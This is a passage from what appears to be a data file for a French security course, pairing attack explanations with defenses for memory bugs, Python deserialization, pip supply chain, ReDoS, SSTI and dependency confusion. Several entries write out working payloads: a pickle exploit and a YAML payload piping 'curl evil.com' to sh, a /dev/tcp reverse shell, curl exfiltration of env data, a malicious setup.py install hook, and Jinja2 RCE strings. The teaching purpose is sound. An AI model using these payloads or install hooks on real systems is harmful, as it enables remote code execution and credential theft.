    hack: "Objectif **pédagogique** : comprendre pourquoi la gestion manuelle de mémoire en C est dangereuse, et ce que les protections modernes apportent.\n\n**Le bug** : un buffer de taille fixe sur la pile rempli sans borne.\n```c\n#include <string.h>\nvoid vuln(char *input) {\n  char buf[64];\n  strcpy(buf, input);   // BUG: pas de borne, déborde si input > 64\n}\nint main(int argc, char **argv) { vuln(argv[1]); }\n// gets(), strcpy(), strcat(), sprintf(), scanf(\"%s\") : la même famille de pièges\n```\nLa pile contient, après `buf` : le **sauvegarde de RBP** puis l'**adresse de retour**. En écrivant >64 octets, on écrase l'adresse de retour ; en la remplaçant par une adresse choisie, on détourne le flux d'exécution au `ret`.\n```bash\n# repérer l'offset jusqu'à RIP\ncyclic 200 | ./vuln   # puis cyclic -l <valeur dans RIP>\n```\n\n**Pourquoi l'exploit naïf casse aujourd'hui** (c'est ça l'important du cours) :\n- **Stack canaries** (`-fstack-protector`) : une valeur aléatoire placée avant l'adresse de retour ; si l'overflow l'écrase, le programme `abort()` avant le `ret`.\n- **NX / DEP** : la pile n'est plus exécutable → impossible d'y placer du shellcode et d'y sauter (d'où l'apparition du ROP, cf. rop-intro).\n- **ASLR / PIE** : les adresses (pile, libs, binaire) sont randomisées → on ne peut plus coder une adresse de retour en dur sans une fuite d'info préalable.\nComprendre ces trois barrières = comprendre l'essentiel de la sécu mémoire moderne.\n\n**Outils (pour étudier, en lab)** : gdb + pwndbg/GEF, `checksec`, pwntools, Compiler Explorer pour lire la pile.\n\n**Cadre légal** : à pratiquer sur des binaires de TP / pwn.college, jamais sur des cibles tierces.",
    antiHack: "1. **Fonctions bornées** : `strncpy`/`snprintf`/`strlcpy`, `fgets` au lieu de `gets`, toujours avec la taille du buffer ; mieux : éviter le C brut pour la manipulation de strings non maîtrisées.\n2. **Activer toutes les protections** : `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2 -O2`, NX (défaut), `-fPIE -pie`, et ASLR au niveau OS (`kernel.randomize_va_space=2`).\n3. **Sanitizers en dev/CI** : AddressSanitizer (`-fsanitize=address`) attrape l'overflow à l'exécution ; fuzzing (libFuzzer/AFL++) pour le débusquer.\n4. **Analyse statique** : `-Wall -Wextra`, clang-tidy, cppcheck ; bannir `gets()` (déjà retiré de C11).\n5. **Pour le code nouveau** : préférer un langage à mémoire sûre (Rust) ou des conteneurs C++ bornés quand le contexte le permet.",
    ctfRef: "pwn.college (Memory Errors), TryHackMe Buffer Overflow Prep, ROP Emporium ; `checksec`",
    cve: "Morris Worm 1988 (fingerd gets()), CVE-2014-0160 (Heartbleed, over-read), CWE-121",
    youtubeSearch: "stack buffer overflow tutorial canary NX ASLR pwntools",
  },
  {
    slug: "use-after-free",
    moduleNumber: 3,
    kind: "duo",
    language: "concept",
    title: "Use-After-Free (UAF)",
    oneLiner: "Utiliser un pointeur après free() : si l'attaquant réalloue la zone, il contrôle ce que lit/exécute le programme.",
    hack: "**Le bug** : un objet est libéré, mais un pointeur (dangling) continue de pointer dessus et est réutilisé.\n```c\nstruct obj { void (*handler)(void); char data[32]; };\nstruct obj *o = malloc(sizeof *o);\n// ...\nfree(o);          // libéré\n// ... plus loin, on oublie qu'il est libre :\no->handler();     // BUG: use-after-free\n```\n**Exploitation (concept)** : l'allocateur recycle la mémoire libérée. Si l'attaquant déclenche, entre le `free` et l'usage, une **allocation de même taille** qu'il remplit (heap grooming/spray), il place ses données là où l'ancien objet vivait. Quand le code lit `o->handler`, il lit la valeur de l'attaquant → détournement du flux (ou fuite d'info en lecture).\n\nClasse très présente dans les **navigateurs** (objets DOM/JS libérés mais référencés), les parseurs, les noyaux. Le **double-free** est un cousin (libérer deux fois corrompt les métadonnées de l'allocateur, cf. heap-exploitation).\n\n**Outils d'étude** : AddressSanitizer (détecte le UAF immédiatement), gdb+pwndbg pour observer le tas, Valgrind.\n\n**Cadre légal** : étude sur binaires de TP / labs uniquement.",
    antiHack: "1. **`free(p); p = NULL;`** systématiquement → un usage ultérieur déréférence NULL (crash net) au lieu d'une zone recyclée contrôlable. Idiome ou macro maison.\n2. **Ownership clair** : un seul propriétaire d'une allocation ; en C++, smart pointers (`unique_ptr`/`shared_ptr`) ; en Rust, le borrow checker élimine la classe entière à la compilation.\n3. **AddressSanitizer + fuzzing** en CI : ASan attrape les UAF/double-free à l'exécution ; AFL++/libFuzzer les fait surgir.\n4. **Allocateurs durcis** : `hardened_malloc`, `GWP-ASan` en prod, quarantaine/delayed-free pour rendre la réallocation immédiate impossible.\n5. **Analyse statique** (clang-tidy, Coverity) pour repérer les dangling pointers et les flux free→use.\n6. **Architecture** : isoler le parsing non fiable dans un process sandboxé pour limiter l'impact d'un UAF résiduel.",
    ctfRef: "pwn.college (Dynamic Allocator Misuse), HeapLAB (Max Kamper) ; AddressSanitizer docs",
    cve: "Nombreuses CVE navigateurs (ex. CVE-2021-21224 V8), CWE-416",
    youtubeSearch: "use after free exploitation heap spray AddressSanitizer explained",
  },
  {
    slug: "format-string",
    moduleNumber: 3,
    kind: "duo",
    language: "concept",
    title: "Format String (printf user-controlled)",
    oneLiner: "printf(input) au lieu de printf(\"%s\", input) → lecture (%x/%s) et écriture (%n) arbitraires de mémoire.",
    hack: "**Le bug** : passer une chaîne contrôlée par l'utilisateur **comme format** de `printf`/`fprintf`/`syslog`.\n```c\nvoid log_user(char *input) {\n  printf(input);          // BUG: input est le format\n}\n```\nQuand `input` contient des spécificateurs, `printf` va **lire des arguments qui n'existent pas** (sur la pile/registres).\n\n**Lecture mémoire** :\n```\n%x %x %x %x        # dumpe des mots de la pile\n%7$p               # lit directement le 7e argument (positional)\n%s                 # déréférence un pointeur de la pile -> fuite (ou crash)\n```\nUtile pour **fuiter** un canary ou une adresse (et défaire l'ASLR).\n\n**Écriture mémoire — `%n`** : `%n` écrit le **nombre d'octets déjà imprimés** à l'adresse pointée par l'argument.\n```\n# en combinant largeur de champ (%100x) et %n, on écrit une valeur choisie\n# à une adresse choisie -> écraser une entrée GOT, un pointeur de fonction...\nAAAA%6$n          # écrit 4 à l'adresse 'AAAA' (positionnée sur la pile)\n```\nC'est une **primitive write-what-where** complète → souvent RCE.\n\n**Outils** : pwntools (`fmtstr_payload`), gdb+pwndbg.\n\n**Cadre légal** : labs / binaires de TP uniquement.",
    antiHack: "1. **Toujours un format littéral** : `printf(\"%s\", input)`, `fputs(input, stdout)`, `puts(input)` — jamais `printf(input)`. Idem `fprintf`, `sprintf`, `syslog`, `err`/`warn`.\n2. **`-Wformat -Wformat-security` (voire `-Werror=format-security`)** : le compilateur refuse un format non littéral non constant.\n3. **`-D_FORTIFY_SOURCE=2`** : neutralise `%n` dans les formats writable et durcit les `*printf`.\n4. **Analyse statique** (clang-tidy, cppcheck) pour repérer les formats non constants.\n5. Sur de nombreuses libc, `%n` est déjà bloqué dans les formats en mémoire inscriptible — mais ne pas s'en remettre à ça : corriger l'appel.",
    ctfRef: "pwn.college (Format String), picoCTF format string challenges ; pwntools fmtstr",
    cve: "CVE-2012-0809 (sudo format string), CWE-134",
    youtubeSearch: "format string vulnerability %n %x exploitation printf tutorial",
  },
  {
    slug: "integer-overflow-c",
    moduleNumber: 3,
    kind: "duo",
    language: "concept",
    title: "Integer Overflow / Underflow en C",
    oneLiner: "Un calcul d'entier qui déborde fausse une taille d'allocation → heap overflow en aval.",
    hack: "Les entiers C sont de **taille fixe** et bouclent silencieusement. Le danger naît quand un entier sert à **dimensionner une allocation ou une copie**.\n\n**Overflow → sous-allocation → heap overflow** :\n```c\nvoid copy(uint16_t n, char *src) {\n  char *buf = malloc(n + 1);   // BUG: si n == 65535, n+1 == 0 (wrap)\n  memcpy(buf, src, n);         // malloc(0) puis copie de 65535 octets -> overflow\n}\n// ou : malloc(count * size) qui overflow -> buffer trop petit\nvoid *p = malloc(count * sizeof(elem)); // count attaquant -> wrap -> petit buffer\n```\n\n**Signed vs unsigned** : un index signé négatif converti en `size_t` devient énorme ; une comparaison de longueur signée bypassée par une valeur négative.\n```c\nint len = get_len();        // attaquant met len = -1\nif (len > MAX) return err;   // -1 > MAX est faux -> passe\nmemcpy(dst, src, len);       // len reinterprété en size_t -> copie gigantesque\n```\n\n**Underflow** : `size_t x = a - b;` avec `b > a` → très grand nombre.\n\nC'est rarement exploitable seul : ça **fabrique** le bug mémoire suivant (heap overflow, OOB). Classe très présente dans les parseurs (images, polices, médias).\n\n**Outils** : UBSan (`-fsanitize=integer`), ASan pour le débordement résultant, fuzzing.\n\n**Cadre légal** : labs / TP uniquement.",
    antiHack: "1. **Vérifs d'overflow explicites** : `__builtin_add_overflow` / `__builtin_mul_overflow` (GCC/Clang) avant toute alloc/copie ; ou `reallocarray`/`calloc(count, size)` qui vérifient `count*size`.\n2. **Types adaptés et cohérents** : `size_t` pour les tailles/index ; éviter de mélanger signé/non signé ; valider les bornes AVANT conversion.\n3. **Valider les longueurs** issues de l'extérieur contre une borne max **en signé** avant de les utiliser comme taille.\n4. **Sanitizers** : `-fsanitize=undefined,integer` (UBSan) en dev/CI attrape les overflows signés et les conversions douteuses ; ASan attrape le débordement mémoire conséquent.\n5. **`-Wconversion -Wsign-conversion`** + analyse statique pour repérer les conversions implicites dangereuses.\n6. Préférer des bibliothèques de parsing robustes / langages à arithmétique vérifiée pour les formats hostiles.",
    ctfRef: "pwn.college, picoCTF (integer overflow challenges) ; UBSan / ASan docs",
    cve: "CVE-2002-0639 (OpenSSH), nombreuses CVE de parseurs d'images ; CWE-190 / CWE-191",
    youtubeSearch: "integer overflow C heap overflow signedness vulnerability explained",
  },
  {
    slug: "heap-exploitation",
    moduleNumber: 3,
    kind: "offensive",
    language: "concept",
    title: "Heap Exploitation — bases (métadonnées, double-free, tcache)",
    oneLiner: "Corrompre les métadonnées de l'allocateur pour transformer un free en primitive d'écriture — niveau intro/conceptuel.",
    hack: "Vue **conceptuelle** du fonctionnement de l'allocateur (glibc `ptmalloc`/tcache) et de pourquoi sa corruption mène à l'exécution de code. Pas un copier-coller d'exploit prêt à l'emploi.\n\n**Le modèle** : `malloc`/`free` gèrent des chunks reliés par des **métadonnées inline** (taille, pointeurs de listes libres « bins »). Quand on libère un chunk, son pointeur de chaînage est stocké **dans la zone de données réutilisable** → si on peut écrire dans un chunk libéré, on peut **mentir à l'allocateur**.\n\n**Double-free** : libérer deux fois le même chunk corrompt la liste libre. La tcache (glibc moderne) garde une liste simplement chaînée par taille ; un double-free permet de faire revenir le **même chunk** deux fois, puis d'orienter le prochain `malloc` vers une adresse arbitraire.\n\n**Tcache poisoning (intro)** : après un UAF/overflow sur un chunk libéré, on écrase son pointeur `next` (`fd`) → le 2e `malloc` de cette taille renvoie une adresse **choisie par l'attaquant** → primitive write-what-where (écraser `__free_hook`, une entrée GOT, un pointeur de fonction). glibc récente ajoute le **safe-linking** (XOR du `fd` avec l'adresse) qui complique la chose.\n\nEnchaînement typique en CTF : *fuite d'adresse (cf. format-string) → ASLR défait → tcache poisoning → contrôle de `__free_hook` → shell*.\n\n**Outils d'étude** : gdb + pwndbg/GEF (`heap`, `bins`), how2heap (shellphish), HeapLAB.\n\n**Cadre légal** : exclusivement sur binaires de challenge / pwn.college. Ce sont des primitives d'intrusion.",
    antiHack: "1. **Tuer la cause racine** : ces exploits ne partent que d'un UAF/double-free/overflow → corriger ceux-là (cf. use-after-free, integer-overflow-c) ; AddressSanitizer + fuzzing en CI.\n2. **Allocateurs durcis** : `hardened_malloc` (GrapheneOS), `scudo` (LLVM), Guard pages, randomisation et isolation des classes de taille, quarantaine anti-double-free.\n3. **Protections glibc** : tenir une glibc à jour (tcache double-free detection, **safe-linking**, alignment checks) ; ne pas désactiver les hardenings.\n4. **NX + PIE + full RELRO** (`-Wl,-z,relro,-z,now`) : GOT en lecture seule → coupe une cible classique des primitives d'écriture.\n5. **Sandboxing** : isoler le code qui parse de l'input non fiable (seccomp, process séparé) pour limiter l'impact d'une corruption résiduelle.\n6. Quand c'est possible, **langage à mémoire sûre** pour la couche exposée.",
    ctfRef: "pwn.college (Heap), how2heap (shellphish), HeapLAB (Max Kamper)",
    cve: "CWE-415 (double-free), CWE-122 (heap overflow) ; nombreuses CVE glibc/navigateurs",
    youtubeSearch: "heap exploitation tcache poisoning double free how2heap intro",
  },
  {
    slug: "rop-intro",
    moduleNumber: 3,
    kind: "offensive",
    language: "concept",
    title: "Return-Oriented Programming (intro)",
    oneLiner: "NX empêche d'exécuter ta pile ? On exécute le code déjà présent, en chaînant des « gadgets » via la pile.",
    hack: "Introduction **conceptuelle**. Avec NX/DEP, on ne peut plus mettre du shellcode sur la pile et y sauter (cf. buffer-overflow-stack). Le contournement : **réutiliser des bouts de code existants** dans le binaire et ses libs.\n\n**Gadget** = une courte séquence d'instructions se terminant par `ret` (ex. `pop rdi ; ret`). En contrôlant la pile (via un overflow), on enchaîne les adresses de gadgets : chaque `ret` saute au gadget suivant. On assemble ainsi un petit programme « Turing-complet » sans jamais injecter de code exécutable.\n\n**ret2libc** (le plus simple à comprendre) : au lieu de gadgets, on fait retourner la fonction directement dans `system(\"/bin/sh\")` de la libc.\n```\n# layout de pile (x86-64), conceptuel :\n[ overflow ... ][ &(pop rdi; ret) ][ &\"/bin/sh\" ][ &system ]\n#   bourrage      gadget pour arg1   adresse str    fonction cible\n```\nLes calling conventions imposent de placer les arguments dans des registres → d'où les gadgets `pop rdi/rsi/rdx ; ret`.\n\n**Prérequis** : il faut souvent une **fuite d'adresse** d'abord (ASLR/PIE), via un format string ou un autre primitive — d'où l'enchaînement leak → ROP.\n\n**Outils d'étude** : ROPgadget / ropper (trouver les gadgets), pwntools (`ROP` object), ROP Emporium (challenges progressifs).\n\n**Cadre légal** : challenges / labs uniquement — ce sont des techniques d'exploitation offensive.",
    antiHack: "1. **Corriger l'overflow** qui sert de point d'entrée (cf. buffer-overflow-stack) : stack canaries, bornes, ASan/fuzzing.\n2. **CFI (Control-Flow Integrity)** : `-fsanitize=cfi` / Clang CFI, Intel **CET** (IBT + **shadow stack**) → un `ret` ne peut plus sauter vers une adresse arbitraire ; la shadow stack détecte l'écrasement de l'adresse de retour.\n3. **ASLR fort + PIE + full RELRO** : sans fuite d'adresse, construire une chaîne ROP fiable devient bien plus dur ; RELRO protège la GOT.\n4. **Réduire la surface de gadgets** : éviter de lier statiquement du code inutile ; `-fstack-clash-protection` ; binaires minimaux.\n5. **Langage à mémoire sûre** pour la couche exposée : pas d'overflow ⇒ pas de détournement de flux.\n6. **Sandboxing** (seccomp) : même avec une chaîne ROP, restreindre les syscalls atteignables (pas d'`execve`).",
    ctfRef: "ROP Emporium, pwn.college (Return Oriented Programming) ; ROPgadget / ropper",
    cve: "Classe d'exploitation post-NX (CWE-787 sous-jacent) ; pas de CVE unique",
    youtubeSearch: "return oriented programming ROP intro ret2libc gadget CFI shadow stack",
  },

  // ==================== M04 — Python (outillage) ====================
  {
    slug: "python-unsafe-deserialization",
    youtubeSearch: "python pickle yaml.load eval RCE deserialization",
    moduleNumber: 4,
    kind: "duo",
    language: "python",
    title: "Python — désérialisation non sûre (pickle / yaml.load / eval-exec)",
    oneLiner: "Tout input non-trusté passé à pickle.loads, yaml.load ou eval/exec = RCE serveur immédiate.",
    hack: "Le piège commun : un script Python prend une donnée venue du réseau (cookie, body, fichier uploadé, message de queue) et la **reconstruit en objet** ou l'**évalue** sans valider. Trois portes, le même résultat : exécution de code arbitraire.\n\n**1. pickle.loads — la plus dangereuse**\n`pickle` n'est PAS un format de données, c'est un format de **programme**. À la désérialisation il appelle `__reduce__`, qui peut retourner n'importe quel callable.\n```python\nimport pickle, base64\napp.route('/load', methods=['POST'])\ndef load():\n    data = base64.b64decode(request.cookies['session'])\n    obj = pickle.loads(data)   # BUG: input réseau désérialisé\n    return str(obj)\n```\nForger le payload RCE (côté attaquant) :\n```python\nimport pickle, base64, os\nclass Exploit:\n    def __reduce__(self):\n        # (callable, (args,)) -> exécuté pendant pickle.loads\n        return (os.system, ('curl http://evil.com/x.sh | sh',))\npayload = base64.b64encode(pickle.dumps(Exploit()))\nprint(payload.decode())\n# -> à placer dans le cookie 'session'\n```\nVariante reverse shell : `('/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"',)`.\nBlind (pas de sortie) : exfil DNS/HTTP `os.system('curl http://evil.com/$(whoami)')`.\nSurfaces réelles : sessions Flask picklées, cache **Django pickle backend**, files Celery/RQ, fichiers `.pkl` de modèles ML téléchargés (PyTorch `torch.load` utilise pickle !).\n\n**2. yaml.load sans SafeLoader**\nL'ancien `yaml.load(data)` (PyYAML < 5.1, ou `Loader=FullLoader`/`UnsafeLoader`) instancie des **objets Python arbitraires** via les tags `!!python/...`.\n```python\nimport yaml\ncfg = yaml.load(request.body)   # BUG: FullLoader/UnsafeLoader\n```\nPayloads :\n```yaml\n# instanciation d'objet -> appelle os.system\n!!python/object/apply:os.system [\"curl evil.com|sh\"]\n```\n```yaml\n# variante subprocess\n!!python/object/apply:subprocess.check_output [[\"id\"]]\n```\nÀ noter : `FullLoader` (défaut historique de `yaml.load`) bloque `apply` mais **pas** toutes les instanciations selon la version — seul `SafeLoader` est sûr.\n\n**3. eval / exec / pickle déguisé sur input user**\nLe classique « calculatrice » ou « filtre dynamique » :\n```python\n@app.route('/calc')\ndef calc():\n    return str(eval(request.args['expr']))   # BUG\n```\nPayloads (eval suffit pour du RCE complet, pas besoin d'exec) :\n```python\n__import__('os').system('id')\n# bypass quand 'os'/builtins sont filtrés :\n().__class__.__bases__[0].__subclasses__()  # remonter aux classes -> Popen\n[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Popen'][0]('id',shell=True)\n```\nMême logique pour `exec()`, `os.system(f\"...{user}\")`, `subprocess(..., shell=True)`, `str.format` avec attribut user-controlled, et `Template(...).render()` côté SSTI (Jinja2, cf. ssti-jinja2).\n\n**Outils** : `pickora`/`pypickle` (forge de payloads pickle), `pickletools.dis(payload)` (lire les opcodes d'un pickle suspect), `peas`/PayloadsAllTheThings (Insecure Deserialization, Python), `fenjing`/`tplmap` (SSTI Jinja2).\n\n**Cadre légal** : labs / cibles autorisées uniquement.",
    antiHack: "1. **JAMAIS `pickle.loads` sur des données non-trustées.** Pickle est non-sécurisable par conception. Pour de l'échange de données : **JSON** (`json.loads`) + validation de schéma (Pydantic). Pour des objets typés : msgpack/protobuf, jamais pickle exposé au réseau.\n2. **YAML : toujours `yaml.safe_load(...)`** (ou `Loader=SafeLoader`). Bannir `yaml.load` sans loader, `FullLoader`, `UnsafeLoader`. Lint : règle Bandit `B506` (yaml_load) en CI.\n3. **Bannir `eval`/`exec` sur de l'input user — point.** Pour évaluer des expressions mathématiques : `ast.literal_eval` (ne gère que des littéraux, pas d'appels) ou une lib dédiée (`simpleeval`, `asteval`) avec namespace restreint. `literal_eval` ne suffit PAS si tu as besoin d'opérations — utilise un vrai parseur.\n4. **Si un format binaire signé est indispensable** : signer le blob avec **HMAC** (`hmac.compare_digest`) et vérifier la signature AVANT de désérialiser. Mais cela ne protège que de la falsification, pas d'une clé fuitée — préférer JSON.\n5. **Modèles ML** : charger avec `torch.load(..., weights_only=True)` (PyTorch ≥ 2.x) ou le format **safetensors** (pas de pickle du tout). Ne jamais charger un `.pkl`/`.pt`/`.h5` d'origine inconnue.\n6. **Défense en profondeur** : process Python non-root, FS read-only, egress réseau filtré (bloque le `curl evil.com` et le reverse shell), seccomp/AppArmor pour interdire `execve` au worker qui n'en a pas besoin.\n7. **Détection** : Bandit (`B301` pickle, `B506` yaml, `B307` eval) + Semgrep en CI ; alerter sur tout `pickle.loads`/`yaml.load`/`eval`/`exec` dans une revue de code.",
    ctfRef: "Root-Me — Python deserialization (pickle/YAML), TryHackMe Insecure Deserialization, HackTheBox \"baby website rick\" (pickle), picoCTF Python sandbox escapes",
    cve: "CVE-2017-18342 (PyYAML yaml.load par défaut non sûr → safe_load forcé en 5.1), CVE-2020-1747 (PyYAML FullLoader contournable), CVE-2019-20477 (PyYAML), CVE-2022-1471 (SnakeYAML Java, même classe)",
    // "Pickle Deserialization RCE" — démo forge __reduce__ + pickle.loads RCE
    // "YAML: code execution using !!python/object" — PoC tag !!python/object
    // "Talkie Pwnii #8: From Predictable Tokens to YAML Deserialization RCE in Python" (Pwnii / Intigriti)
    youtubeIds: ["e3e3m5i5twE", "Za6czm2w5S8", "kSiuk2s-GpA"],
  },
  {
    slug: "supply-chain-pip",
    moduleNumber: 4,
    kind: "duo",
    language: "concept",
    title: "Supply Chain — pip / PyPI",
    oneLiner: "Un package compromis (typosquat, mainteneur piraté, postinstall) = ton env Python pwn dès le `pip install`.",
    hack: "Installer un package, c'est **exécuter du code d'un inconnu** sur ta machine et en CI.\n\n**1. Typosquatting** : un nom proche d'un package populaire. `pip install requsts` / `python-dateutil` vs `python3-dateutil`, `urllib` (faux) vs `urllib3`. Le faux package exécute du code malveillant à l'installation.\n```python\n# setup.py du package piégé : exécuté pendant `pip install`\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport os\nclass Post(install):\n    def run(self):\n        os.system('curl http://evil/$(env | base64)')   # exfil .env, tokens\n        install.run(self)\nsetup(name='requsts', cmdclass={'install': Post}, ...)\n```\nL'équivalent moderne (wheels/PEP 517) peut exécuter du code dans le build backend ; le risque « code à l'install » reste réel.\n\n**2. Account takeover du mainteneur** : compte PyPI sans 2FA piraté → push d'une version backdoorée d'un package légitime que tout le monde met à jour (cf. `ctx`, `ssh-decorate`).\n\n**3. Dépendance transitive** : tu fais confiance à `A`, mais `A` dépend de `B` dépend de `C` compromis. La surface est énorme.\n\n**Vecteurs réels Python** : nombreux typosquats retirés de PyPI régulièrement ; campagnes ciblant les data scientists (faux packages ML).\n\n**Outils défensifs** : `pip-audit`, Safety, Socket.dev, OSV-Scanner, Bandit (sur ton code).\n\n**Cadre légal** : publier un package piégé est un délit — analyse uniquement, jamais de mise en ligne offensive.",
    antiHack: "1. **Lockfile + hashes** : `pip install --require-hashes -r requirements.txt`, ou Poetry/PDM/uv avec lockfile committé. Pins exacts, pas de plages floues.\n2. **`pip-audit` / OSV-Scanner en CI** : casse le build sur une dépendance vulnérable connue ; **Socket.dev** pour les comportements suspects (postinstall qui fetch, accès réseau au build).\n3. **2FA obligatoire** sur les comptes PyPI des mainteneurs ; pour publier, **Trusted Publishing (OIDC)** plutôt que des tokens longue durée.\n4. **Vérifier le nom exact** avant install (typosquat), regarder les téléchargements/âge/source du package ; éviter `pip install` ad hoc en prod.\n5. **Isoler l'installation** : venv dédié, CI éphémère sans secrets exposés au build, egress filtré pendant l'install pour bloquer l'exfil.\n6. **Index privé** pour les deps internes (cf. dependency-confusion) ; audit régulier de l'arbre de dépendances transitives.",
    ctfRef: "PyPI security advisories, OpenSSF / OSV ; études de typosquatting PyPI",
    cve: "Campagnes typosquatting PyPI (ctx, ssh-decorate, etc.) ; ua-parser-js (npm, même classe)",
    youtubeSearch: "PyPI supply chain attack typosquatting pip install malicious package",
  },
  {
    slug: "redos",
    moduleNumber: 4,
    kind: "duo",
    language: "both",
    title: "ReDoS (Regular Expression DoS)",
    oneLiner: "Une regex catastrophique fait crasher le serveur en quelques secondes sur un seul input.",
    hack: "**Pattern vulnérable** : quantifieurs imbriqués + alternance → backtracking exponentiel.\n\n**Python (`re`)** :\n```python\nimport re\nre.match(r'^(a+)+$', 'a' * 32 + 'X')   # bloque le worker plusieurs secondes\n# emails maison classiques : r'^([a-zA-Z0-9]+)*@' -> idem\n```\n`re` est mono-thread et bloque le process : un seul input piégé gèle le worker (et le moteur `re` n'a **pas** de timeout natif).\n\n**JS (RegExp)** :\n```js\nconst regex = /^(a+)+$/;\n// Input: \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\" (33 'a' + X)\n// Backtracking exponentiel -> 30 s à bloquer l'event loop (tout le serveur figé)\n```\n\n**Real-world** :\n- Cloudflare WAF outage 2019 : regex `.*(?:.*=.*)` → 27 min de downtime global.\n- Stack Exchange 2016 : regex sur trim → outage.\n\n**Recherche de patterns vulnérables** :\n```bash\nnpx safe-regex 'pattern'        # JS\npip install regex && # ou outils d'analyse statique ReDoS\nsemgrep --config p/redos\n```\n\n**Exploitation** : envoie l'input piégé sur tout endpoint qui applique une regex à de l'input user (email, URL, parsing).\n\n**Cadre légal** : à tester sur tes services / labs.",
    antiHack: "1. **Audit** : `safe-regex` (JS), règles Semgrep/CodeQL ReDoS, `recheck` pour détecter le backtracking exponentiel.\n2. **Limiter la longueur AVANT la regex** : `if len(input) > 200: reject` — coupe l'explosion.\n3. **Moteur sans backtracking** : `re2` (`google-re2` en Python, RE2 lib en JS/natif) → temps linéaire garanti sur input hostile.\n4. **Timeout / isolation** : exécuter une regex user-controlled dans un worker/process séparé avec timeout (le module `re` n'a pas de timeout interne).\n5. **Réécrire les patterns** : éviter `(a+)+`, `(a|aa)+`, alternances ambiguës ; ancrer (`^...$`), être spécifique.\n6. **Préférer un parseur** (Pydantic/Zod) à une regex maison pour valider emails/URLs.",
    ctfRef: "OWASP ReDoS, regex101 (debugger backtracking) ; safe-regex / recheck",
    cve: "CVE-2017-16129 (lodash _.template), Cloudflare outage 2019",
    // "How regexes got catastrophic" — explication backtracking exponentiel
    youtubeIds: ["gITmP0IWff0"],
  },
  {
    slug: "ssti-jinja2",
    moduleNumber: 4,
    kind: "duo",
    language: "python",
    title: "SSTI — Server-Side Template Injection (Jinja2 / Flask)",
    oneLiner: "De l'input user concaténé dans un template Jinja2 : {{7*7}} s'évalue → puis RCE via les attributs Python.",
    hack: "**Le bug** : construire un template avec de l'input utilisateur **avant** de le rendre, au lieu de le passer en variable.\n```python\nfrom flask import request\nfrom jinja2 import Template\n\n@app.route('/hello')\ndef hello():\n    name = request.args['name']\n    # BUG: name est interpolé DANS la source du template\n    return Template('Bonjour ' + name).render()\n    # vulnérable aussi : render_template_string(f\"Bonjour {name}\")\n```\n**Détection** : injecter `{{7*7}}` → si la réponse affiche `49`, le template évalue l'input (≠ XSS, c'est côté serveur).\n\n**Escalade vers RCE** : Jinja2 expose l'objet Python ; on remonte la hiérarchie de classes pour atteindre un exécuteur.\n```jinja\n{{ ''.__class__.__mro__[1].__subclasses__() }}        {# liste des classes #}\n{# accéder aux globals d'une fonction puis os : #}\n{{ cycler.__init__.__globals__.os.popen('id').read() }}\n{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}\n{# via subprocess : #}\n{{ ''.__class__.__base__.__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() }}\n```\nLa charge utile exacte (`__globals__`, `__builtins__`, index de `__subclasses__`) dépend de la version ; l'idée reste : *string vide → sa classe → bases → subclasses / globals → `os`/`subprocess`*.\n\n**Outils** : `tplmap`, `fenjing`, PayloadsAllTheThings (Server Side Template Injection — Jinja2).\n\n**Cadre légal** : labs PortSwigger / cibles autorisées uniquement.",
    antiHack: "1. **Ne jamais mettre d'input user dans la SOURCE d'un template.** Passer les données en **variables** : `render_template('hello.html', name=name)` — `{{ name }}` est alors échappé, pas évalué. Bannir `Template(user)`, `render_template_string(f\"...{user}\")`.\n2. **Logique hors template** : le template affiche, il ne calcule pas. Aucun `f-string`/concat construisant du markup template avec de l'entrée externe.\n3. **autoescape activé** (défaut Flask/Jinja2 sur `.html`) pour bloquer le XSS — mais ça **ne protège pas** du SSTI : la vraie parade est de ne pas injecter dans la source.\n4. **Sandbox en dernier recours** : `jinja2.sandbox.SandboxedEnvironment` si tu dois absolument rendre des templates fournis — en sachant que des bypass existent ; à coupler avec isolation process + seccomp.\n5. **Détection** : Bandit / Semgrep (règles SSTI Jinja2), revue de tout `render_template_string`/`Template(...)` avec une variable.\n6. **Défense en profondeur** : moindre privilège, egress filtré (coupe le `os.popen('curl evil')`).",
    ctfRef: "PortSwigger — Server-side template injection (labs), HackTricks SSTI, PayloadsAllTheThings",
    cve: "CVE-2016-10745 (Jinja2 sandbox escape), classe CWE-1336 / CWE-94",
    youtubeSearch: "SSTI server side template injection jinja2 flask RCE tutorial",
  },
  {
    slug: "dependency-confusion",
    moduleNumber: 4,
    kind: "duo",
    language: "concept",
    title: "Dependency Confusion",
    oneLiner: "Publier sur l'index public un package au nom de ta dépendance interne → le gestionnaire installe la version publique piégée.",
    hack: "Découvert par Alex Birsan (2021), qui a pwn Apple, Microsoft, PayPal & co avec un simple package.\n\n**Le principe** : ton org utilise un package interne `acme-utils` depuis un registre privé. Si le gestionnaire est configuré pour chercher **aussi** sur l'index public et qu'il **préfère la version la plus haute** sans distinguer la source, un attaquant qui publie `acme-utils 99.0.0` sur **PyPI/npm public** voit son package installé à la place de l'interne.\n```python\n# le package public piégé exécute du code à l'install -> beacon\n# (setup.py / build backend) :\nimport os, socket, getpass\nos.system(f\"curl http://evil/?h={socket.gethostname()}&u={getpass.getuser()}\")\n```\nL'attaquant n'a même pas besoin de connaître le code : juste **le nom** de la dépendance interne (souvent fuité dans un `package.json`, un `requirements.txt`, des logs de build, un repo public).\n\n**Surfaces** : pip (`--extra-index-url` qui mélange privé et PyPI), npm (scope manquant), tout gestionnaire qui agrège plusieurs sources sans priorité stricte.\n\n**Cadre légal** : revendiquer un nom pour piéger une org est une attaque réelle — analyse / défense uniquement, ou bug bounty avec scope écrit.",
